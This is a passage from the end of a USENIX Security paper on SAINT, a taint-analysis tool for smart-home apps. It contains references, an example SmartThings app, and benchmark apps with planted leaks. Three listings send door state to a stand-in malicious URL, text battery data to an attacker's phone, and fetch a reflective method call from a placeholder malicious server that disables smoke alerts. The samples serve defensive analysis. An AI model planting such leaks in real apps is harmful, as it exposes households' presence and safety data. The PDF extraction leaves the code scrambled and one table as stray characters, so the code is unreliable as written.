Government. The U.S. Government is authorized to re-
produce and distribute reprints for Government purposes
notwithstanding any copyright notation here on.
(cid:63)SAINT is available at http://saint-project.appspot.com.
USENIX Association
27th USENIX Security Symposium    1699
References
[1] APPLE’S HOMEKIT. https://www.apple.com/ios/home/.
[Online; accessed 9-January-2018].
[2] APPLE’S HOMEKIT APP MARKET. https://support.apple.
com/en-us/HT204893. [Online; accessed 9-January-2018].
[3] APPLE’S HOMEKIT
SECURITY
ON
https://www.apple.com/business/docs/iOS_
IOS.
Security_Guide.pdf. [Online; accessed 9-January-2018].
AND
PRIVACY
[4] APPLE’S HOMEKIT SUBMISSION GUIDELINE.
https://
developer.apple.com/app-store/review/guidelines.
[Online; accessed 9-January-2018].
[5] ARZT, S., RASTHOFER, S., FRITZ, C., BODDEN, E., BARTEL,
A., KLEIN, J., LE TRAON, Y., OCTEAU, D., AND MCDANIEL,
P. FlowDroid: Precise Context, Flow, Field, Object-sensitive and
Lifecycle-aware Taint Analysis for Android Apps. ACM SIGPLAN
Notices (2014).
[6] CELIK, Z. B., MCDANIEL, P., AND TAN, G. Soteria: Automated
IoT Safety and Security Analysis. In USENIX ATC (2018).
[7] CLAUSE, J., ET AL. Dytan: a Generic Dynamic Taint Analysis
Framework. In ACM Software Testing and Analysis (2007).
[8] EFFTINGE, S., EYSHOLDT, M., K ¨OHNLEIN, J., ZARNEKOW,
S., VON MASSOW, R., HASSELBRING, W., AND HANUS, M.
Xbase: Implementing Domain-speciﬁc Languages for Java. In
ACM SIGPLAN Notices (2012).
[9] ENCK, W., GILBERT, P., HAN, S., TENDULKAR, V., CHUN,
B.-G., COX, L. P., JUNG, J., MCDANIEL, P., AND SHETH,
A. N. TaintDroid: An Information-Flow Tracking System for
Realtime Privacy Monitoring on Smartphones. ACM Transaction
on Computer Systems (2014).
[10] FERNANDES, E., JUNG, J., AND PRAKASH, A. Security Analysis
of Emerging Smart Home Applications. In IEEE Security and
Privacy (SP) (2016).
[11] FERNANDES, E., PAUPORE, J., RAHMATI, A., SIMIONATO, D.,
CONTI, M., AND PRAKASH, A. FlowFence: Practical Data Pro-
tection for Emerging IoT Application Frameworks. In USENIX
Security (2016).
[12] GORDON, M. I., KIM, D., PERKINS, J. H., GILHAM, L.,
Information Flow Anal-
NGUYEN, N., AND RINARD, M. C.
ysis of Android Applications in DroidSafe. In NDSS (2015).
[13] GROOVY CONSOLE: THE GROOVY SWING CONSOLE. http://
groovy-lang.org/groovyconsole.html. [Online; accessed
10-January-2018].
[14] GROOVYCODEVISITOR: AN IMPLEMENTATION OF THE
GROOVY VISITOR PATTERNS. http://docs.groovy-lang.
org/docs. [Online; accessed 10-January-2018].
[15] GU, B., LI, X., LI, G., CHAMPION, A. C., CHEN, Z., QIN, F.,
AND XUAN, D. D2Taint: Differentiated and Dynamic Information
Flow Tracking on Smartphones for Numerous Data Sources. In
INFOCOM (2013).
[16] HEALTHSAAS: THE INTERNET OF THINGS (IOT) PLATFORM
FOR HEALTHCARE. https://www.healthsaas.net/. [On-
line; accessed 20-January-2018].
[17] HO, G., LEUNG, D., MISHRA, P., HOSSEINI, A., SONG, D.,
AND WAGNER, D. Smart Locks: Lessons for Securing Commodity
Internet of Things Devices. In ACM AsiaCCS (2016).
[18] IFTTT (IF THIS, THEN THAT). https://ifttt.com/, 2017.
[Online; accessed 11-January-2018].
[19] IOT PLATFORM COMPARISON.
[Online; accessed 29-January-2018].
https://goo.gl/y8kzmY.
[21] JIA, Y. J., CHEN, Q. A., WANG, S., RAHMATI, A., FERNAN-
DES, E., MAO, Z. M., PRAKASH, A., AND UNVIERSITY, S. J.
ContexIoT: Towards Providing Contextual Integrity to Appiﬁed
IoT Platforms. In NDSS (2017).
[22] KAAIOT: CONNECTED CAR AND IOT AUTOMOTIVE. https:
//www.kaaproject.org/automotive/. [Online; accessed 20-
January-2018].
[23] KANG, M. G., MCCAMANT, S., POOSANKAM, P., AND SONG,
D. Dta++: Dynamic Taint Analysis with Targeted Control-ﬂow
Propagation. In NDSS (2011).
[24] LATTNER, C. LLVM compiler infrastructure project. The archi-
tecture of open source applications, 2012.
[25] MCLAUGHLIN, S., AND MCDANIEL, P. SABOT: Speciﬁcation-
based Payload Generation for Programmable Logic Controllers.
In ACM CCS (2012).
[26] MYERS, A. C. JFlow: Practical Mostly-static Information Flow
Control. In ACM SIGPLAN-SIGACT Symposium on Principles of
Programming Languages (1999).
[27] NAEINI, P. E., ET AL. Privacy expectations and preferences in an
iot world. In USENIX SOUPS (2017).
[28] OLUWAFEMI, T., KOHNO, T., GUPTA, S., AND PATEL, S. Ex-
perimental Security Analyses of Non-Networked Compact Fluo-
rescent Lamps: A Case Study of Home Automation Security. In
USENIX LASER (2013).
[29] OPENHAB IOT APP MARKET (ECLIPSE MARKET PLACE).
[Online;
http://docs.openhab.org/eclipseiotmarket.
accessed 9-January-2018].
[30] OPENHAB IOT APP SUBMISSION GUIDELINE. https://goo.
gl/W63tEo. [Online; accessed 9-January-2018].
[31] OPENHAB: OPEN SOURCE AUTOMATION SOFTWARE FOR
[Online; accessed 9-
HOME. https://www.openhab.org/.
January-2018].
[32] RAHMATI, A., FERNANDES, E., AND PRAKASH, A. Applying
the Opaciﬁed Computation Model to Enforce Information Flow
Policies in IoT Applications. In IEEE Cybersecurity Development
(SecDev) (2016).
[33] RONEN, E., SHAMIR, A., WEINGARTEN, A.-O., AND O’FLYNN,
C. IoT Goes Nuclear: Creating a ZigBee Chain Reaction. In IEEE
Security and Privacy (SP) (2017).
[34] SAMSUNG SMARTTHINGS.
https://www.smartthings.
com/. [Online; accessed 9-January-2018].
[35] SIKDER, A. K., AKSU, H., AND ULUAGAC, A. S. 6thSense: A
Context-aware Sensor-based Attack Detector for Smart Devices.
In USENIX Security (2017).
[36] SMARTTHINGS CODE REVIEW GUIDELINES AND BEST
PRACTICES. http://docs.smartthings.com/en/latest/
code-review-guidelines.html.
[Online; accessed 29-
January-2018].
[37] SMARTTHINGS COMMUNITY FORUM FOR THIRD-PARTY APPS.
https://community.smartthings.com/. [Online; accessed
10-January-2018].
[38] SMARTTHINGS
OFFICIAL
API
DOCUMENTATION.
http://docs.smartthings.com/en/latest/ref-docs/
reference.html. [Online; accessed 9-January-2018].
[39] SMARTTHINGS OFFICIAL APP REPOSITORY.
https://
github.com/SmartThingsCommunity. [Online; accessed 10-
January-2018].
[40] SMARTTHINGS OFFICIAL DEVELOPER DOCUMENTATION.
[Online; accessed 29-
http://docs.smartthings.com.
January-2018].
[20] IOTBENCH: A MICRO-BENCHMARK SUITE TO ASSESS THE
EFFECTIVENESS OF TOOLS DESIGNED FOR IOT APPS. https:
//github.com/IoTBench. [Online; accessed 29-April-2018].
[41] SMARTTHINGS SUPPORTED IOT PRODUCTS (DEVICES).
[Online; ac-
https://www.smartthings.com/products.
cessed 29-January-2018].
1700    27th USENIX Security Symposium
USENIX Association
[42] SMARTTHINGS
WEB-SERVICE
APP
OVERVIEW.
http://docs.smartthings.com/en/latest/
smartapp-web-services-developers-guide/overview.
html, 2017. [Online; accessed 9-January-2018].
[43] VASISHT, D., KAPETANOVIC, Z., WON, J., JIN, X., CHAN-
DRA, R., SINHA, S. N., KAPOOR, A., SUDARSHAN, M., AND
STRATMAN, S. FarmBeats: An IoT Platform for Data-Driven
Agriculture. In NSDI (2017).
[44] WANG, Q., HASSAN, W. U., BATES, A., AND GUNTER, C. Fear
and logging in the internet of things. In NDSS (2018).
[45] XU, T., WENDT, J. B., AND POTKONJAK, M. Security of
In IEEE
IoT Systems: Design Challenges and Opportunities.
Computer-Aided Design (2014).
[46] YANG, Y., ET AL. A survey on Security and Privacy Issues in
Internet-of-Things. IEEE Internet of Things Journal (2017).
[47] ZENG, E., MARE, S., AND ROESNER, F. End User Security &
Privacy Concerns with Smart Homes. In USENIX SOUPS (2017).
[48] ZHU, D. Y., JUNG, J., SONG, D., KOHNO, T., AND WETHER-
ALL, D. TaintEraser: Protecting Sensitive Data Leaks Using
Application-level Taint Tracking. SIGOPS Operating Systems
Review (2011).
the Groovy source code of the home-
A Source Code of the Example App
We present
automation app’s IR shown in Figure 4, Sec. 4.
Listing 1: An example home-automation app
1 deﬁnition(
2
3
4
5
6
7
name: "SmartApp",
namespace: "mygithubusername",
author: "SainT",
description: "This is an app for home automation",
category: "My Apps",
iconUrl: "https://s3.amazonaws.com/smartapp-icons/
iconX2Url: "https://s3.amazonaws.com/smartapp-icons/
iconX3Url: "https://s3.amazonaws.com/smartapp-icons/
Convenience/Cat-Convenience.png",
Convenience/PI:EMAIL",
Convenience/PI:EMAIL")
8
9
10
11 preferences {
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
section("When you are away/home") {
input "presenceSensor", "capability.presenceSensor",
required: true, title: "Which presence sensor?"
multiple: true,
}
section("Turn on the lights") {
input "theSwitches", "capability.switch", required:
title: "Which lights?"
true, multiple: true,
}
section("Lock/Unlock door") {
input "theDoor", "capability.door", multiple: false,
required: true, title: "Which door?"
}
section("Notify between what times?") {
input "fromTime", "time", title: "From", required: true
input "toTime", "time", title: "To", required: true
}
section("Send Notifications?") {
input("recipients", "contact", title: "Send
notifications to") {
}
}
text message",
input "phone", "phone", title: "Warn security with
description: "Phone Number", required: true
34
35
36
37
38 }
39
40 def installed() {
41
42 }
43
44 def updated() {
log.debug "Updated with settings: ${settings}"
45
unsubscribe()
46
initialize()
47
initialize()
log.debug "initialize configured"
subscribe(presenceSensor, "present", h1)
subscribe(presenceSensor, "not present", h2)
log.debug "presence active called: $evt"
x()
log.debug "presence not active called: $evt"
theSwitches.oﬀ()
theDoor.unlock()
def between = y()
if (between){
}
def currSwitches = theSwitches.currentSwitch
def onSwitches = currSwitches.ﬁndAll { switchVal –>
}
log.debug "${onSwitches.size()} out of ${switches.size
switchVal == "on" ? true : false
()} switches are on"
z()
48 }
49
50 def initialize() {
51
52
53
54 }
55
56 def h1(evt) {
57
58
59 }
60
61 def h2(){
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76 }
77
78 def x(){
79
80
81
82
83
84
85
86 }
87
88 def y(){
89
90
91 }
92
93 def z(){
94
95
96
97
98 }
theSwitches.on()
theDoor.unlock()
def currSwitches = theSwitches.currentSwitch
def onSwitches = currSwitches.ﬁndAll { switchVal –>
}
log.debug "${onSwitches.size()} out of ${theSwitches.
switchVal == "on" ? true : false
size()} switches are on"
log.debug "In time method"
return timeOfDayIsBetween(fromTime, toTime, new
Date(), location.timeZone)
log.debug "recipients configured: $recipients"
sendSms(phone, "The ${theDoor.displayName} is locked
def latestValue = theDoor.latestValue("door")
log.debug "message sent, the door status is
and the ${theSwitches.displayName} is off!")
$latestValue"
B IoTBench Apps
Table 3 presents IOTBENCH apps categorized by their data
leak ground-truth. We present three example apps and
their privacy violations below.
Our ﬁrst app “Implicit Permission 1” (ID: 11) sends
a short message to household members when everyone
is away. We update an existing legitimate app to include
a code block that transmits the state of the door via the
leak() method to a remote server (see Listing 2). A
privacy violation occurs because the door state, which
informs households are not at home, is leaked to the mali-
cious server.
Listing 2: Device state leak through Internet interface
1 if (everyoneIsAway()){
2
3
4 }
5 def leak() {
6
7
8
9
10 }
Params = [
uri: "https://malicious-url",
body: ["condition":"$thedoor.latestValue("door")"]]
httpPost(Params) // leak
//app logic
leak() // invoke when everyone is away
USENIX Association
27th USENIX Security Symposium    1701
The second app “Explicit-Implicit” (ID: 14) sends a
short message to users when a door lock has a low bat-
tery. A code block is added to an existing app to send the
battery level (implicit permission) and hub id (explicit per-
mission) to a third-party’s phone number via sendSms()
when the sms send variable is true (see Listing 3). Here,
sms send is tainted via the state object’s SMS ﬁeld. The
leaked battery level is a privacy violation.
Listing 3: Leak of battery level and hub ID
1 def BatteryPowerHandler(evt) {
sms send = state.SMS // true
2
msg = "$doorBattery.currentValue("battery")
3
4
power is out in hub ${evt.hubId}!"
sendPush(msg) // user gets a push notiﬁcation
5
6
if (sms send) { // attacker gets the same message
7
8
}
9
10 }
sendSms(attacker phone, msg) // leak
Internet
Messaging
sendSms()
sendSmsMessage()
sendNotiﬁcationEvent()
sendNotiﬁcation()
sendNotiﬁcationToContacts()
sendPush()
sendPushMessage()
httpDelete()
httpGet()
httpHead()
httpPost()
httpPostJson()
httpPut()
httpPutJson()
GET (web service apps)
PUT (web services apps)
POST (web service apps)
DELETE (web service apps)
Table 1: SmartThings taint-sink APIs.
if(resp.status == 200){
}
state.method = resp.data.toString()
"$state.method"() // reﬂective call
httpGet("http://maliciousServer.com"){
Our ﬁnal example is the “Call by Reﬂection 1” app
(ID: 5). The app is used to trigger the alarm when smoke
is detected. This app obtains the method name string
from a remote server and uses this string to invoke
$state.method (see Listing 4). Thus, the updateApp()
method can be called by reﬂection. Because SAINT adds
all methods in an app as possible call targets, it detects
a data leak in updateApp(), which disables alarm by
unsubscribing the “smoke-detected” event and sends this
information to a hardcoded phone number.
Listing 4: Leak via a reﬂective call
1 def attack(){
2
resp –>
3
4
5
6
7
8 }
9 updateApp() {
10
11
12 }
C Taint Source and Taint Sink APIs
We present SmartThings APIs that are taint sinks in Ta-
ble 1 and APIs that are taint sources in Table 2. We refer
the interested reader to SmartThings API documentation
for the details [38]. For taint sinks, SmartThings recently
announced asynchronous HTTP requests available as a
beta development feature [40]. However, the analyzed
apps do not use asynchronous HTTP APIs; thus we ex-
clude them from the list. We note that some taint-source
APIs are used together with the device names assigned
by the developer, or require speciﬁc device capabilities to
use them. Therefore, the number of taint sources used in
an app differs based on the app’s context.
unsubscribe() // revoke smoke detector events
sendSms(attacker phone,"$detector is revoked")
1702    27th USENIX Security Symposium
USENIX Association
e
t
u
b
i
r
t
t
a
d
e
ﬁ
i
c
e
p
s
e
h
t
r
o
f
d
r
o
c
e
r
e
t
a
t
S
e
c
i
v
e
D
t
s
e
t
a
l
e
h
t
d
e
ﬁ
i
c
e
p
s
e
t
a
d
e
h
t
e
c
n
i
s
e
t
a
t
S
e
c
i
v
e
D
f
o
t
s
i
l
a
d
n
a
m
m
o
c
e
h
t
r
o
f
s
e
p
y
t
t
n
e
m
u
g
r
a
f
o
t
s
i
l
e
h
t
t
c
e
j
b
o
e
t
a
D
a
s
a
t
n
e
v
e
e
h
t
f
o
e
u
l
a
v
e
h
t
e
t
a
t
S
e
c
i
v
e
D
e
l
b
u
o
D
a
s
a
t
n
e
v
e
t
a
o
l
F
a
s
a
e
h
t
e
h
t
f
o
e
u
l
a
v
f
o
e
u
l
a
v
t
n
e
v
e
e
h
t
f
o
n
o
i
t
p
i
r
c
s
e
d
e
h
t
e
h
t
e
h
t
s
t
e
G
s
t
e